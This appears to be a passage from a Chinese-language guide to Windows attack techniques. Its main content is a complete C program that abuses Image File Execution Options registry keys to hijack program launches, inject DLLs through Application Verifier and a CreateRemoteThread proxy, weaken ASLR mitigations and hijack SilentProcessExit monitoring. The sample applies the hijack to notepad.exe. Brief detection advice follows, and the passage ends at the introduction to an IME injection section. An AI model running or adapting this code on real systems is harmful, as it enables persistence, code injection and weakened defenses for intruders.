
```c
#include <windows.h>

#include <stdio.h>



#pragma comment(lib, "advapi32.lib")



#define IFEO_BASE L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"



typedef enum {

    IFEO_DEBUGGER,        // 经典 Debugger 重定向

    IFEO_VERIFIER,        // Application Verifier DLL 注入

    IFEO_GLOBALFLAG,      // 全局标志（页堆、栈回溯等）

    IFEO_MITIGATION,      // 进程缓解策略修改

    IFEO_SILENT_EXIT      // 静默退出监控（WerFault 劫持）

} IFEO_METHOD;



BOOL InstallIfeo(const WCHAR* targetExe, const WCHAR* payload, IFEO_METHOD method) {

    WCHAR keyPath[512];

    swprintf_s(keyPath, 512, L"%s\\%s", IFEO_BASE, targetExe);

    

    HKEY hKey;

    DWORD disposition;

    LONG ret = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, &disposition);

    if (ret != ERROR_SUCCESS) return FALSE;

    

    BOOL result = FALSE;

    

    switch (method) {

        case IFEO_DEBUGGER: {

            // 方法1：经典 Debugger 劫持

            // 当系统启动 targetExe 时，实际启动的是 payload，targetExe 作为参数

            result = (RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, 

                (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);

            break;

        }

        

        case IFEO_VERIFIER: {

            // 方法2：Application Verifier 注入

            // 设置 GlobalFlag 启用 verifier，指定自定义 verifier DLL

            DWORD globalFlag = 0x100;  // FLG_APPLICATION_VERIFIER

            RegSetValueExW(hKey, L"GlobalFlag", 0, REG_DWORD, (BYTE*)&globalFlag, sizeof(DWORD));

            result = (RegSetValueExW(hKey, L"VerifierDlls", 0, REG_SZ,

                (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);

            break;

        }

        

        case IFEO_GLOBALFLAG: {

            // 方法3：启用页堆 + 栈回溯等调试功能

            DWORD flags = 0x02000000 | 0x1000;  // FLG_HEAP_PAGE_ALLOCS | FLG_USER_STACK_TRACE_DB

            result = (RegSetValueExW(hKey, L"GlobalFlag", 0, REG_DWORD, 

                (BYTE*)&flags, sizeof(DWORD)) == ERROR_SUCCESS);

            break;

        }

        

        case IFEO_MITIGATION: {

            // 方法4：修改进程缓解策略

            // 例如禁用 CFG、禁用 ASLR 等（降低目标安全性后再攻击）

            DWORD64 policy = 0;

            // PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_OFF

            policy |= (0x2ULL << 8);

            // PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_OFF

            policy |= (0x2ULL << 16);

            

            WCHAR mitigation[128];

            swprintf_s(mitigation, 128, L"%llu", policy);

            result = (RegSetValueExW(hKey, L"MitigationOptions", 0, REG_SZ,

                (BYTE*)mitigation, (DWORD)((wcslen(mitigation) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);

            break;

        }

        

        case IFEO_SILENT_EXIT: {

            // 方法5：静默退出监控

            // 当进程退出时触发 WerFault 或自定义监控程序

            DWORD reportingMode = 1;  // LAUNCH_MONITORPROCESS

            RegSetValueExW(hKey, L"ReportingMode", 0, REG_DWORD, (BYTE*)&reportingMode, sizeof(DWORD));

            result = (RegSetValueExW(hKey, L"MonitorProcess", 0, REG_SZ,

                (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);

            

            // 还需要在 SilentProcessExit 子键配置

            WCHAR silentKey[512];

            swprintf_s(silentKey, 512, L"%s\\%s\\SilentProcessExit", IFEO_BASE, targetExe);

            HKEY hSilent;

            if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, silentKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hSilent, NULL) == ERROR_SUCCESS) {

                RegSetValueExW(hSilent, L"MonitorProcess", 0, REG_SZ, (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(WCHAR)));

                RegSetValueExW(hSilent, L"ReportingMode", 0, REG_DWORD, (BYTE*)&reportingMode, sizeof(DWORD));

                RegCloseKey(hSilent);

            }

            break;

        }

    }

    

    RegCloseKey(hKey);

    return result;

}



BOOL RemoveIfeo(const WCHAR* targetExe) {

    WCHAR keyPath[512];

    swprintf_s(keyPath, 512, L"%s\\%s", IFEO_BASE, targetExe);

    return (RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath) == ERROR_SUCCESS);

}



// Debugger 代理程序（作为 payload 使用）

// 当系统通过 IFEO 启动此程序时，原始 exe 路径在 argv[1]

#ifdef BUILD_DEBUGGER_PROXY

int wmain(int argc, WCHAR* argv[]) {

    if (argc < 2) return 1;

    

    // argv[1] = 原始目标程序路径

    // 可以在此注入 DLL 后再启动目标程序

    

    STARTUPINFOW si = { sizeof(si) };

    PROCESS_INFORMATION pi = {0};

    

    // 注入方式：CREATE_SUSPENDED -> 注入 DLL -> ResumeThread

    if (CreateProcessW(argv[1], GetCommandLineW(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {

        // 在这里执行 DLL 注入

        WCHAR dllToInject[] = L"C:\\payload.dll";

        SIZE_T dllPathSize = (wcslen(dllToInject) + 1) * sizeof(WCHAR);

        

        LPVOID remoteBuf = VirtualAllocEx(pi.hProcess, NULL, dllPathSize, MEM_COMMIT, PAGE_READWRITE);

        WriteProcessMemory(pi.hProcess, remoteBuf, dllToInject, dllPathSize, NULL);

        

        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");

        LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

        

        HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pLoadLibrary, remoteBuf, 0, NULL);

        WaitForSingleObject(hThread, 5000);

        CloseHandle(hThread);

        VirtualFreeEx(pi.hProcess, remoteBuf, 0, MEM_RELEASE);

        

        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);

        CloseHandle(pi.hProcess);

    }

    

    return 0;

}

#endif



int wmain(int argc, WCHAR* argv[]) {

    // 示例：对 notepad.exe 安装 IFEO Debugger 劫持

    InstallIfeo(L"notepad.exe", L"C:\\debugger_proxy.exe", IFEO_DEBUGGER);

    wprintf(L"IFEO installed for notepad.exe\n");

    

    // 示例：对 target.exe 安装 Verifier DLL 注入

    InstallIfeo(L"target.exe", L"payload.dll", IFEO_VERIFIER);

    wprintf(L"Verifier DLL injection configured for target.exe\n");

    

    return 0;

}

```

### 检测方法

1. 监控 `IFEO` 注册表键的创建和修改（Sysmon Event ID 12/13）

2. 检查所有 `IFEO` 子键是否有 `Debugger`、`VerifierDlls`、`MonitorProcess` 等可疑值

3. 应用白名单：仅允许已知调试器（如 `vsjitdebugger.exe`）作为 `Debugger` 值

---

## 1.13 IME 注入（输入法注入）

### 原理

Windows 输入法（IME）通过注册表 `HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layouts` 注册，每个输入法对应一个 DLL。当用户切换到该输入法时，系统会将对应的 IME DLL 加载到当前焦点进程中。通过注册一个伪造的输入法 DLL，可以实现对任意 GUI 进程的 DLL 注入。

更高级的方式是使用 Text Services Framework（TSF），通过 COM 接口注册 Text Input Processor，实现更隐蔽的注入。

### 完整实现
